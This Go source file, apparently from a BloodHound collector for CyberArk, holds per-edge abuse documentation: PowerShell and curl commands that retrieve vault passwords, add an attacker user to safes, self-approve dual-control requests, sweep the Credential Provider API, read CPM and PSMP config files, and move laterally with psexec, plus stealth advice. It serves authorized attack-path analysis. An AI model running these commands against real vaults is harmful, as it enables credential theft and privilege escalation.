// Package graph provides data structures and functions for building
// BloodHound OpenGraph representations from CyberArk PVWA data.
package graph

// EdgeInfo holds security-relevant documentation for a BloodHound edge type,
// modeled after official SharpHound/AzureHound edge metadata.
type EdgeInfo struct {
	Description  string   `json:"description"`
	WindowsAbuse string   `json:"windowsAbuse"`
	LinuxAbuse   string   `json:"linuxAbuse"`
	OpsecNotes   string   `json:"opsecNotes"`
	References   []string `json:"references"`
}

// EdgeInfoMap contains security documentation for all CyberArkHound edge types.
var EdgeInfoMap = map[string]EdgeInfo{
	"CyberArk_HasAccessTo": {
		Description: "The source principal is a member of the safe containing the target account with one or more account access permissions (useAccounts and/or retrieveAccounts). This is the primary credential access edge in CyberArk. " +
			"The edge properties provide critical context: requiresApproval indicates whether dual-control enforcement is active (access requires an approval workflow before credentials can be retrieved); " +
			"requiresSessionMonitoring and recordsSessionActivity indicate whether privileged sessions must be routed through PSM and whether session content is recorded.",
		WindowsAbuse: "To retrieve the account password directly (requires retrieveAccounts permission):\n\n" +
			"$pvwaURL = 'https://<pvwa>'\n" +
			"$headers = @{Authorization = \"Bearer $token\"}\n" +
			"$body = @{reason = 'authorized access'} | ConvertTo-Json\n" +
			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<accountId>/Password/Retrieve\" `\n" +
			"    -Method POST -Headers $headers -Body $body -ContentType 'application/json'\n\n" +
			"To connect to the target system via PSM without seeing the password (requires useAccounts permission):\n\n" +
			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<accountId>/PSMConnect\" `\n" +
			"    -Method POST -Headers $headers -Body $body -ContentType 'application/json'\n\n" +
			"If requiresApproval is true, first create an access request:\n\n" +
			"$reqBody = @{AccountId = '<accountId>'; Reason = 'authorized access'; AccessType = 'ImmediateAccess'} | ConvertTo-Json\n" +
			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/MyRequests\" `\n" +
			"    -Method POST -Headers $headers -Body $reqBody -ContentType 'application/json'",
		LinuxAbuse: "To retrieve the account password directly (requires retrieveAccounts permission):\n\n" +
			"curl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/Password/Retrieve\" \\\n" +
			"  -H \"Authorization: Bearer $TOKEN\" \\\n" +
			"  -H \"Content-Type: application/json\" \\\n" +
			"  -d '{\"reason\":\"authorized access\"}'\n\n" +
			"To initiate a PSM session (requires useAccounts permission):\n\n" +
			"curl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/PSMConnect\" \\\n" +
			"  -H \"Authorization: Bearer $TOKEN\" \\\n" +
			"  -H \"Content-Type: application/json\" \\\n" +
			"  -d '{\"reason\":\"authorized access\",\"ConnectionComponent\":\"PSM-SSH\"}'",
		OpsecNotes: "Every password retrieval and PSM session initiation is logged in the CyberArk Vault audit trail under the accessing user's identity. " +
			"If requiresApproval is true on the edge, submitting an access request creates a visible approval workflow entry that approvers and auditors can see — access without approval will be denied by the Vault. " +
			"If requiresSessionMonitoring or recordsSessionActivity is true, the session is fully isolated inside PSM: the user never receives the plaintext credential, " +
			"and keystrokes, screen captures, and commands may be recorded and stored in the session recording vault.",
		References: []string{
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/getaccountpasswordvalue.htm",
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/dualcontrolworkflow.htm",
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/manage-psm-for-windows.htm",
		},
	},
	"CyberArk_CanGrantAccessTo": {
		Description: "The source principal has manageSafe or manageSafeMembers permission on the target safe. " +
			"This is a privilege escalation edge: the principal can add new safe members, modify existing member permissions, or remove members. " +
			"By adding themselves (or a controlled account) to the safe with retrieveAccounts permission, the attacker gains access to all accounts stored in that safe.",
		WindowsAbuse: "Add yourself (or a controlled user) to the safe with full account access permissions:\n\n" +
			"$pvwaURL = 'https://<pvwa>'\n" +
			"$headers = @{Authorization = \"Bearer $token\"}\n" +
			"$body = @{\n" +
			"    MemberName  = '<attacker-user>'\n" +
			"    SearchIn    = 'Vault'\n" +
			"    Permissions = @{\n" +
			"        UseAccounts            = $true\n" +
			"        RetrieveAccounts       = $true\n" +
			"        ListAccounts           = $true\n" +
			"        ViewAuditLog           = $false\n" +
			"        ViewSafeMembers        = $false\n" +
			"    }\n" +
			"} | ConvertTo-Json -Depth 5\n" +
			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Safes/<safeUrlId>/Members\" `\n" +
			"    -Method POST -Headers $headers -Body $body -ContentType 'application/json'\n\n" +
			"To modify an existing member's permissions instead:\n\n" +
			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Safes/<safeUrlId>/Members/<memberName>\" `\n" +
			"    -Method PUT -Headers $headers -Body $body -ContentType 'application/json'",
		LinuxAbuse: "Add a controlled user to the safe with account retrieval permissions:\n\n" +
			"curl -s -X POST \"https://<pvwa>/PasswordVault/API/Safes/<safeUrlId>/Members\" \\\n" +
			"  -H \"Authorization: Bearer $TOKEN\" \\\n" +
			"  -H \"Content-Type: application/json\" \\\n" +
			"  -d '{\n" +
			"    \"MemberName\": \"<attacker-user>\",\n" +
			"    \"SearchIn\": \"Vault\",\n" +
			"    \"Permissions\": {\n" +
			"      \"UseAccounts\": true,\n" +
			"      \"RetrieveAccounts\": true,\n" +
			"      \"ListAccounts\": true\n" +
			"    }\n" +
			"  }'",
		OpsecNotes: "All safe member additions and permission modifications are logged in the CyberArk Vault audit trail. " +
			"The new membership will immediately appear in PVWA's safe management UI and in periodic access reviews. " +
			"If SIEM integration is configured, safe membership changes may trigger real-time security alerts. " +
			"Consider using an existing compromised user that already appears in safe membership rather than adding a new member.",
		References: []string{
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/safe-members-add.htm",
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/dv-managing-safes.htm",
		},
	},
	"CyberArk_CanApprove": {
		Description: "The source principal has dual-control approval authority over access requests for accounts within the target safe. " +
			"The approvalLevel property specifies the tier: 1 for first-level approval, 2 for second-level approval. " +
			"A principal with accessWithoutConfirmation permission bypasses the dual-control workflow entirely. " +
			"This edge enables dual-control bypass attacks: if the same principal also has CyberArk_HasAccessTo on an account in this safe where requiresApproval=true, " +
			"they can approve their own access requests. Two colluding principals can mutually authorize each other's requests.",
		WindowsAbuse: "List pending incoming access requests (as approver):\n\n" +
			"$pvwaURL = 'https://<pvwa>'\n" +
			"$headers = @{Authorization = \"Bearer $token\"}\n" +
			"$requests = Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/IncomingRequests\" -Headers $headers\n" +
			"$requests.IncomingRequests | Select-Object RequestId, AccountDetails, Requester\n\n" +
			"Approve a specific request:\n\n" +
			"$confirmBody = @{Reason = 'Approved'} | ConvertTo-Json\n" +
			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/IncomingRequests/<requestId>/Confirm\" `\n" +
			"    -Method POST -Headers $headers -Body $confirmBody -ContentType 'application/json'\n\n" +
			"For accessWithoutConfirmation: no approval step is required — retrieve the credential directly.",
		LinuxAbuse: "List pending incoming access requests:\n\n" +
			"curl -s \"https://<pvwa>/PasswordVault/API/IncomingRequests\" \\\n" +
			"  -H \"Authorization: Bearer $TOKEN\"\n\n" +
			"Approve a request:\n\n" +
			"curl -s -X POST \"https://<pvwa>/PasswordVault/API/IncomingRequests/<requestId>/Confirm\" \\\n" +
			"  -H \"Authorization: Bearer $TOKEN\" \\\n" +
			"  -H \"Content-Type: application/json\" \\\n" +
			"  -d '{\"Reason\":\"Approved\"}'",
		OpsecNotes: "All approval actions are recorded in the CyberArk audit trail under the approving user's identity. " +
			"Self-approval — where the same account submits and approves its own request — may be flagged by security monitoring rules or periodic audit reviews. " +
			"Mutual approval between two colluding accounts is harder to detect without correlated analysis across request and approval events. " +
			"Look for accounts that appear in both CyberArk_HasAccessTo (with requiresApproval=true) and CyberArk_CanApprove edges on the same safe.",
		References: []string{
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/approve-request.htm",
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/dualcontrolworkflow.htm",
		},
	},
	"CyberArk_CanRetrieveViaCCP": {
		Description: "The source CyberArk Application (AppID) is a member of the safe containing the target account with useAccounts and/or retrieveAccounts permission, " +
			"and can therefore retrieve that account's credential through the Central Credential Provider (CCP / AIMWebService) REST API — typically with a single GET request and without any interactive PVWA login. " +
			"The edge properties carry the application's authentication posture: appIsUnrestricted=true means the AppID has no Allowed Machines and no OS user / path / hash / certificate binding, " +
			"so knowledge of the AppID alone is enough to pull the credential from anywhere that can reach the CCP endpoint. allowedMachines lists the IPs/hosts permitted to use the AppID (if any), " +
			"and isDefaultCCPApp=true flags the out-of-the-box AIMWebService application, which usually has access to every safe. " +
			"Tradecraft credit: Marat Nigmatullin (@_mnigma_, FalconForce) — \"4 GET requests = 3 Domain admins: CyberArk magic you didn't know about\", SO-CON 2026.",
		WindowsAbuse: "Retrieve the credential directly from the CCP endpoint using the application's AppID. No PVWA token is required — only network access to the CCP server " +
			"(and, if appIsUnrestricted=false, the request must originate from one of the allowedMachines / run as the permitted OS user / binary):\n\n" +
			"$ccp = 'https://<CCP_Server>'\n" +
			"# Exact lookup for a single account (CCP returns at most ONE match per request):\n" +
			"Invoke-RestMethod -Uri \"$ccp/AIMWebService/api/Accounts?AppID=<AppID>&Safe=<safeName>&UserName=<userName>&Address=<address>\"\n\n" +
			"# RegExp query to search/enumerate the vault one match at a time (QueryFormat=regexp):\n" +
			"Invoke-RestMethod -Uri \"$ccp/AIMWebService/api/Accounts?AppID=<AppID>&QueryFormat=regexp&Query=username=adm\"\n" +
			"Invoke-RestMethod -Uri \"$ccp/AIMWebService/api/Accounts?AppID=<AppID>&QueryFormat=regexp&Query=username=admin;Address=domain1.local\"\n\n" +
			"# The default CCP application usually has access to ALL safes:\n" +
			"Invoke-RestMethod -Uri \"$ccp/AIMWebService/api/Accounts?AppID=AIMWebService&QueryFormat=regexp&Query=username=domainadmin;Address=domain1.local\"\n\n" +
			"The JSON response includes the plaintext 'Content' field (the password) plus account metadata.",
		LinuxAbuse: "Pull the credential from the CCP REST API with curl (the response 'Content' field is the plaintext password):\n\n" +
			"CCP='https://<CCP_Server>'\n" +
			"# Exact, single-account retrieval:\n" +
			"curl -s \"$CCP/AIMWebService/api/Accounts?AppID=<AppID>&Safe=<safeName>&UserName=<userName>&Address=<address>\"\n\n" +
			"# RegExp enumeration (one match per request — iterate to sweep the vault):\n" +
			"curl -s \"$CCP/AIMWebService/api/Accounts?AppID=<AppID>&QueryFormat=regexp&Query=username=adm\"\n" +
			"curl -s \"$CCP/AIMWebService/api/Accounts?AppID=<AppID>&QueryFormat=regexp&Query=username=som[a-z]username[0-9];Address=hostname[a-z].local\"\n\n" +
			"# Default AIMWebService AppID — most likely reads every safe:\n" +
			"curl -s \"$CCP/AIMWebService/api/Accounts?AppID=AIMWebService&QueryFormat=regexp&Query=username=admin;Address=domain1.local\"\n\n" +
			"# If a client certificate is required, supply it:\n" +
			"curl -s --cert client.pem --key client.key \"$CCP/AIMWebService/api/Accounts?AppID=<AppID>&Query=Safe=<safeName>;UserName=<userName>\"",
		OpsecNotes: "CCP credential requests are served outside the interactive PVWA workflow and are not subject to dual-control approval, so a successful retrieval will not raise an approval request. " +
			"CCP usage is still recorded (the Provider writes to its local logs and CCP activity can be collected centrally), and credential retrievals appear in the Vault audit trail under the application identity. " +
			"Because each request returns at most one match, RegExp vault sweeps generate a high volume of requests. " +
			"Detection (per Nigmatullin, SO-CON 2026) keys on CCP responses such as \"Too many password objects\" or \"The Credential Provider has encountered an error\", which indicate brute-force / over-broad RegExp queries. " +
			"Prefer Exact queries against known Safe/Object/UserName values to stay quiet; sweeping RegExp queries are noisy. " +
			"CI/CD runners (GitLab, Azure DevOps, Bitbucket) that hold an AppID are a common foothold for reaching the CCP endpoint.",
		References: []string{
			"https://docs.cyberark.com/credential-providers/latest/en/content/ccp/calling-the-web-service-using-rest.htm",
			"https://docs.cyberark.com/credential-providers/latest/en/content/ccp/the-central%20-credential-provider.htm",
			"https://docs.cyberark.com/credential-providers/latest/en/content/ccp/api-ccp-usage.htm",
			"https://github.com/SpecterOps/presentations/tree/main/SO-CON%202026",
		},
	},
	"CyberArk_MemberOf": {
		Description: "The source CyberArk user or group is a member of the target CyberArk group. " +
			"Group membership is cumulative: a user inherits all permissions granted to every group they belong to across all safes. " +
			"Group edges to safes flow transitively through this membership edge, enabling credential access without direct safe membership.",
		WindowsAbuse: "Group membership itself does not directly grant credential access — follow the group's outgoing edges (CyberArk_HasAccessTo, CyberArk_CanGrantAccessTo) " +
			"to identify which accounts and safes are reachable. Enumerate effective group safe memberships:\n\n" +
			"$pvwaURL = 'https://<pvwa>'\n" +
			"$headers = @{Authorization = \"Bearer $token\"}\n" +
			"# List all safes where this group is a member\n" +
			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Safes?search=<safeName>\" -Headers $headers\n" +
			"# Check group membership in a specific safe\n" +
			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Safes/<safeUrlId>/Members\" -Headers $headers",
		LinuxAbuse: "Enumerate safes where the group has membership:\n\n" +
			"curl -s \"https://<pvwa>/PasswordVault/API/Safes/<safeUrlId>/Members\" \\\n" +
			"  -H \"Authorization: Bearer $TOKEN\"",
		OpsecNotes: "Group membership queries via the REST API are generally not audited in the CyberArk Vault audit trail. " +
			"Effective permission chains through group membership may not be immediately visible in standard PVWA safe membership reports, " +
			"which can list the group rather than its individual members.",
		References: []string{
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/managing-vault-groups.htm",
		},
	},

	"CyberArk_Contains": {
		Description: "The source CyberArk safe contains the target account. " +
			"This is a structural containment relationship: all safe members with account access permissions (useAccounts or retrieveAccounts) can interact with accounts linked through this edge. " +
			"Used for graph traversal — CyberArk_HasAccessTo on the safe's parent combined with this edge maps out full credential exposure.",
		WindowsAbuse: "This edge is used for attack path traversal rather than direct exploitation. " +
			"Enumerate all accounts within a safe to discover reachable credentials:\n\n" +
			"$pvwaURL = 'https://<pvwa>'\n" +
			"$headers = @{Authorization = \"Bearer $token\"}\n" +
			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts?safeName=<safeName>\" -Headers $headers",
		LinuxAbuse: "Enumerate accounts within a safe:\n\n" +
			"curl -s \"https://<pvwa>/PasswordVault/API/Accounts?safeName=<safeName>\" \\\n" +
			"  -H \"Authorization: Bearer $TOKEN\"",
		OpsecNotes: "This structural relationship does not generate audit events on its own. " +
			"Account enumeration within a safe requires the ListAccounts permission and is logged in the Vault audit trail.",
		References: []string{
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/accounts.htm",
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/dv-managing-safes.htm",
		},
	},

	"CyberArk_Created": {
		Description: "The source CyberArk user created the target safe. " +
			"Safe creators are recorded in safe metadata and may retain implicit administrative access depending on vault configuration. " +
			"In some CyberArk deployments, the creator is automatically added as a safe member with elevated permissions at creation time.",
		WindowsAbuse: "Verify whether the creator still has active membership in the safe and what permissions they hold:\n\n" +
			"$pvwaURL = 'https://<pvwa>'\n" +
			"$headers = @{Authorization = \"Bearer $token\"}\n" +
			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Safes/<safeUrlId>/Members\" -Headers $headers | " +
			"Select-Object -ExpandProperty Members | Where-Object {$_.MemberName -eq '<creatorName>'}",
		LinuxAbuse: "Check if the creator still has safe membership:\n\n" +
			"curl -s \"https://<pvwa>/PasswordVault/API/Safes/<safeUrlId>/Members\" \\\n" +
			"  -H \"Authorization: Bearer $TOKEN\" | jq '.Members[] | select(.MemberName==\"<creatorName>\")'",
		OpsecNotes: "Safe creation is logged in the Vault audit trail. The creator's identity is preserved in the safe's metadata properties. " +
			"This relationship is informational — actual access capability requires the creator to have an active safe membership.",
		References: []string{
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/safes-create.htm",
		},
	},
	"CyberArk_ManagedBy": {
		Description: "The target safe is managed by the source CyberArk CPM (Central Password Manager) user. " +
			"The CPM service account has privileged programmatic access to all accounts in managed safes: it performs automated password rotation, verification, and reconciliation. " +
			"Compromising the CPM service account or the CPM server itself grants implicit access to all managed credentials and the ability to disrupt password management operations.",
		WindowsAbuse: "The CPM service account credentials are stored in a dedicated CPM safe within the CyberArk Vault. " +
			"Compromise of the CPM server (typically a Windows Server running CyberArk Password Manager service) may expose credentials through memory or configuration files:\n\n" +
			"# On the CPM server, the service uses the Vault SDK — look for CyberArk process memory or config files\n" +
			"# CPM communicates with the Vault on port 1858 (Vault protocol)\n" +
			"# Configuration: C:\\Program Files (x86)\\CyberArk\\Password Manager\\Vault\\Vault.ini\n" +
			"# Trigger unauthorized password rotation (disruption):\n" +
			"$pvwaURL = 'https://<pvwa>'\n" +
			"$headers = @{Authorization = \"Bearer $token\"}\n" +
			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<accountId>/Change\" `\n" +
			"    -Method POST -Headers $headers",
		LinuxAbuse: "CPM is primarily a Windows component. However, UNIX CPM (for managing Unix/Linux accounts) may run on Linux:\n\n" +
			"# Check CPM configuration on Linux deployments\n" +
			"ls /opt/CARKcpm/\n" +
			"cat /opt/CARKcpm/vault/vault.ini\n\n" +
			"# Trigger password rotation via REST API:\n" +
			"curl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/Change\" \\\n" +
			"  -H \"Authorization: Bearer $TOKEN\"",
		OpsecNotes: "CPM service account activity is logged under the CPM user identity in the Vault audit trail. " +
			"Unexpected password rotations or verification failures generate alerts and may be visible in PVWA's account activity view. " +
			"CPM users are among the most privileged accounts in a CyberArk deployment — their compromise is a critical security event that typically triggers incident response.",
		References: []string{
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/managing-the-cpm.htm",
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pas-installation/install-cpm.htm",
		},
	},

	"CyberArk_UsesPlatform": {
		Description: "The source account is configured to use the target platform definition. " +
			"The platform governs: password policy (complexity, rotation frequency), connection settings, dual-control requirements, PSM server routing, and Master Policy exception flags. " +
			"All accounts sharing a platform share the same security policy baseline — a platform-level policy exception affects every account on that platform simultaneously.",
		WindowsAbuse: "Retrieve platform configuration to identify policy exceptions that weaken security controls:\n\n" +
			"$pvwaURL = 'https://<pvwa>'\n" +
			"$headers = @{Authorization = \"Bearer $token\"}\n" +
			"# Get platform details including policy exceptions\n" +
			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Platforms/<platformId>\" -Headers $headers\n\n" +
			"# Look for: RequireDualControlPasswordAccessApproval=false (disables dual control)\n" +
			"# Look for: EnforceCheckinCheckoutExclusiveAccess=false (allows concurrent access)\n" +
			"# List all accounts on this platform to identify the scope of affected accounts:\n" +
			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts?platformId=<platformId>\" -Headers $headers",
		LinuxAbuse: "Retrieve platform configuration:\n\n" +
			"curl -s \"https://<pvwa>/PasswordVault/API/Platforms/<platformId>\" \\\n" +
			"  -H \"Authorization: Bearer $TOKEN\"\n\n" +
			"List accounts using this platform:\n\n" +
			"curl -s \"https://<pvwa>/PasswordVault/API/Accounts?platformId=<platformId>\" \\\n" +
			"  -H \"Authorization: Bearer $TOKEN\"",
		OpsecNotes: "Platform configuration reads are non-invasive and generally not audited. " +
			"Platform modifications require Vault Administrator or equivalent privileges and are logged. " +
			"Unexpected platform reassignment of high-value accounts may indicate privilege escalation attempts.",
		References: []string{
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/manage-platforms.htm",
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/master-policy.htm",
		},
	},
	"CyberArk_UsedAccount": {
		Description: "The source CyberArk user has historically accessed the target account, as recorded in CyberArk audit logs. " +
			"Unlike CyberArk_HasAccessTo (which shows current permissions), this edge confirms actual historical credential use. " +
			"The lastUsedTime property indicates the most recent access timestamp, lastActivity indicates the action type (e.g. RetrievePassword, Connect), " +
			"and usageCount shows the total number of recorded access events within the collection window.",
		WindowsAbuse: "This edge is primarily forensic and investigative rather than directly exploitable. " +
			"Use it to identify which accounts are operationally active, which users have the broadest credential access history, " +
			"and which credentials are most likely to be cached or in active use by target users:\n\n" +
			"$pvwaURL = 'https://<pvwa>'\n" +
			"$headers = @{Authorization = \"Bearer $token\"}\n" +
			"# Query account activity history directly\n" +
			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<accountId>/Activities\" -Headers $headers",
		LinuxAbuse: "Query account activity history:\n\n" +
			"curl -s \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/Activities\" \\\n" +
			"  -H \"Authorization: Bearer $TOKEN\"",
		OpsecNotes: "This edge is derived from existing audit log data — the historical access events are already recorded. " +
			"Querying this data does not generate new audit events. " +
			"Note that a user may have accessed an account historically but no longer have current permissions — always cross-reference with CyberArk_HasAccessTo edges to confirm active access rights.",
		References: []string{
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/get-activities.htm",
		},
	},

	"CyberArk_LinkedTo": {
		Description: "The source account has a credential dependency on the target account. " +
			"The linkType property specifies the relationship type: " +
			"'logon' means the target account provides the credentials CyberArk uses to connect to the source account's target system (the logon account is used to authenticate to the machine where the source account lives); " +
			"'reconcile' means the target account is used to reset the source account's password when rotation fails; " +
			"'enable' means the target account is used to enable/unlock the source account during password rotation. " +
			"Compromising a logon account gives implicit access to all accounts that depend on it, since CyberArk uses the logon account to manage those accounts on the target system.",
		WindowsAbuse: "For linkType=logon — the logon account's password is used by CyberArk to connect to the target system. " +
			"Retrieving the logon account's password gives credentials valid on the target system, " +
			"and since the logon account authenticates to manage all dependent accounts, its credentials provide access to the same systems:\n\n" +
			"$pvwaURL = 'https://<pvwa>'\n" +
			"$headers = @{Authorization = \"Bearer $token\"}\n" +
			"# Retrieve the logon account password (the target of this edge)\n" +
			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<logonAccountId>/Password/Retrieve\" `\n" +
			"    -Method POST -Headers $headers -Body '{}' -ContentType 'application/json'\n\n" +
			"# Use those credentials for lateral movement to the target system\n" +
			"$cred = New-Object System.Management.Automation.PSCredential('<user>', (ConvertTo-SecureString '<retrieved-pass>' -AsPlainText -Force))\n" +
			"Invoke-Command -ComputerName <targetSystem> -Credential $cred -ScriptBlock {whoami}",
		LinuxAbuse: "For linkType=logon — retrieve the logon account credentials and use for lateral movement:\n\n" +
			"# Retrieve the logon account password\n" +
			"LOGON_PASS=$(curl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<logonAccountId>/Password/Retrieve\" \\\n" +
			"  -H \"Authorization: Bearer $TOKEN\" \\\n" +
			"  -H \"Content-Type: application/json\" \\\n" +
			"  -d '{}' | tr -d '\"')\n\n" +
			"# Use with Impacket or SSH for lateral movement\n" +
			"impacket-psexec '<user>:<password>@<targetSystem>'\n" +
			"ssh <user>@<targetSystem>",
		OpsecNotes: "Logon account chains are frequently overlooked in privilege analysis because they are not obvious from safe membership alone. " +
			"The logon account for many privileged accounts is itself a highly privileged service account managed by CyberArk. " +
			"Retrieving a logon account's password is logged in the audit trail; however, the cascading effect on all dependent accounts is not immediately apparent. " +
			"Monitor for unusual access to logon and reconcile accounts — these are typically only accessed by the CPM service, not by human operators.",
		References: []string{
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/configuring-accounts.htm",
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/defining-logon-account.htm",
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/defining-reconcile-account.htm",
		},
	},
	"CyberArk_UsesPSMServer": {
		Description: "The source platform routes all privileged session connections through the target PSM (Privileged Session Manager) server. " +
			"Every account using this platform has its sessions isolated, brokered, and recorded by this PSM server. " +
			"The PSM server acts as a proxy between the requesting user and the target system — users connect to the PSM server, which then connects to the target using the managed credential.",
		WindowsAbuse: "Compromising the PSM server exposes all sessions it processes — including live in-flight sessions and stored session recordings. " +
			"The PSM server runs on Windows Server with CyberArk PSM components:\n\n" +
			"# PSM stores session recordings locally before transferring to the Session Recording vault\n" +
			"# Default recording path: C:\\ProgramData\\CyberArk\\PSM\\Sessions\\\n" +
			"# Recordings are in CyberArk proprietary format — playable via PVWA Recordings viewer\n" +
			"# PSM server also caches connection parameters that may contain target system details\n" +
			"# Lateral movement to PSM server may be possible via its Windows Attack Surface (RDP, WinRM, etc.)",
		LinuxAbuse: "PSM for Windows is a Windows-only component. PSM for SSH (PSMP) runs on Linux and handles SSH session brokering:\n\n" +
			"# PSMP default installation path\n" +
			"ls /opt/CARKpsmp/\n" +
			"# Session recordings and logs\n" +
			"ls /var/opt/CARKpsmp/logs/\n" +
			"# PSMP configuration\n" +
			"cat /etc/opt/CARKpsmp/basic_psmpserver.conf",
		OpsecNotes: "PSM servers are high-value targets and typically have enhanced security controls and monitoring. " +
			"All privileged sessions passing through PSM are logged with full session metadata. " +
			"The PSM server itself is typically hardened and managed by CyberArk — direct access to PSM servers is usually restricted to infrastructure administrators.",
		References: []string{
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/manage-psm-for-windows.htm",
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/psm-manage-recordings.htm",
		},
	},

	"CyberArk_ManagedByPSM": {
		Description: "The source account's privileged sessions are managed and recorded by the target PSM server, inferred from the account's platform PSM configuration. " +
			"This edge directly links a specific account to its session recording infrastructure, identifying which PSM server processes connections to that account's target system.",
		WindowsAbuse: "Compromising the PSM server identified by this edge grants the ability to intercept sessions for this specific account. " +
			"All connections to the target system using this account are proxied through the PSM server:\n\n" +
			"# To initiate a PSM-brokered session to this account's target system:\n" +
			"$pvwaURL = 'https://<pvwa>'\n" +
			"$headers = @{Authorization = \"Bearer $token\"}\n" +
			"$body = @{Reason = 'authorized'; ConnectionComponent = 'PSM-RDP'} | ConvertTo-Json\n" +
			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<accountId>/PSMConnect\" `\n" +
			"    -Method POST -Headers $headers -Body $body -ContentType 'application/json'",
		LinuxAbuse: "Initiate a PSM-brokered SSH session:\n\n" +
			"curl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/PSMConnect\" \\\n" +
			"  -H \"Authorization: Bearer $TOKEN\" \\\n" +
			"  -H \"Content-Type: application/json\" \\\n" +
			"  -d '{\"Reason\":\"authorized\",\"ConnectionComponent\":\"PSM-SSH\"}'",
		OpsecNotes: "All PSM-brokered sessions are logged with full session metadata and content recording. " +
			"The end user never receives the plaintext credential — authentication to the target system is performed internally by PSM. " +
			"Session recordings are stored in the CyberArk Session Recording vault and can be reviewed by administrators.",
		References: []string{
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/manage-psm-for-windows.htm",
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/psm-connect.htm",
		},
	},

	"CyberArk_HasConnectionComponent": {
		Description: "The source platform has the target connection component enabled, defining the session protocols available for accounts on this platform. " +
			"Common connection components include PSM-RDP (Remote Desktop), PSM-SSH (Secure Shell), PSM-Telnet, PSM-WebApp, and custom components. " +
			"The enabled property indicates if the component is currently active. " +
			"This determines which protocols an attacker can use when initiating PSM-brokered sessions through CyberArk_HasAccessTo edges.",
		WindowsAbuse: "RDP connection components (e.g. PSM-RDP, PSM-RDP-LCL) enable interactive desktop sessions to Windows target systems without exposing the plaintext password:\n\n" +
			"$pvwaURL = 'https://<pvwa>'\n" +
			"$headers = @{Authorization = \"Bearer $token\"}\n" +
			"# Initiate RDP session via PSM (requires useAccounts permission on the account)\n" +
			"$body = @{Reason = 'authorized'; ConnectionComponent = 'PSM-RDP'} | ConvertTo-Json\n" +
			"$rdpFile = Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<accountId>/PSMConnect\" `\n" +
			"    -Method POST -Headers $headers -Body $body -ContentType 'application/json'\n" +
			"# The response contains an RDP file or redirect URL to launch the session",
		LinuxAbuse: "SSH connection components enable shell access to Unix/Linux targets through PSM for SSH (PSMP):\n\n" +
			"# Initiate SSH session via PSMP using the PSM-SSH connection component\n" +
			"# Syntax: ssh <user>@<pvwa-or-psmp-host> -p <port>\n" +
			"# PSMP intercepts the connection and authenticates to the target using the vault credential\n\n" +
			"# Or via REST API:\n" +
			"curl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/PSMConnect\" \\\n" +
			"  -H \"Authorization: Bearer $TOKEN\" \\\n" +
			"  -H \"Content-Type: application/json\" \\\n" +
			"  -d '{\"Reason\":\"authorized\",\"ConnectionComponent\":\"PSM-SSH\"}'",
		OpsecNotes: "All connection component sessions are fully logged and recorded by PSM. " +
			"Session recordings include keystroke logging and screen capture depending on platform configuration. " +
			"The type of connection component reveals target system types: RDP implies Windows systems, SSH implies Unix/Linux or network devices.",
		References: []string{
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/cc-about-connection-components.htm",
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/psm-connect.htm",
		},
	},
	"CyberArk_SyncsToUser": {
		Description: "The source Active Directory user is synchronized to the target CyberArk Vault user via LDAP directory integration. " +
			"The AD user's identity and credentials are mapped directly to the CyberArk user — if LDAP authentication is configured on the PVWA, " +
			"the AD user's password (or Kerberos ticket) authenticates them to CyberArk without a separate Vault password. " +
